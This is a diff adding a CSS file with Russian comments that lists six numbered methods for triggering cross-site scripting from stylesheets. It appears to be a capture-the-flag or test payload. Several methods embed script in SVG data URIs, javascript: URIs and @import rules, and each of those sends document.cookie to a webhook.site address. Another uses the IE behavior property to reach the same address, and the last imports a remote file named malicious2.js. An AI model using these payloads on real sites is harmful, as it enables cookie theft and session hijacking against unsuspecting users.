@@ -1,0 +1,35 @@
+/* Метод 1: @font-face с data URI SVG для вызова JavaScript */
+@font-face {
+    font-family: 'XSS';
+    src: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>fetch('https://webhook.site/cf2541c9-2417-4163-8573-8692a9b3fcc5/?cookie='+document.cookie)</script></svg>");
+}
+
+body {
+    font-family: 'XSS';
+}
+
+/* Метод 2: background-image с javascript: URI (редко работает, но включено для теста) */
+body {
+    background-image: url("javascript:fetch('https://webhook.site/cf2541c9-2417-4163-8573-8692a9b3fcc5/?cookie='+document.cookie)");
+}
+
+/* Метод 3: Попытка отправки на вебхук через @import с data:text/javascript */
+@import url("data:text/javascript,fetch('https://webhook.site/cf2541c9-2417-4163-8573-8692a9b3fcc5/?cookie='+document.cookie)");
+
+/* Метод 4: CSS-анимация для попытки манипуляции с DOM */
+@keyframes xss {
+    from { color: red; }
+    to { color: blue; }
+}
+
+body {
+    animation: xss 1s infinite;
+}
+
+/* Метод 5: behavior для отправки данных на вебхук (работает только в IE) */
+body {
+    behavior: url("https://webhook.site/cf2541c9-2417-4163-8573-8692a9b3fcc5");
+}
+
+/* Метод 6: @import с внешним скриптом */
+@import url("https://cdn.jsdelivr.net/gh/romabess/ctf@main/malicious2.js");
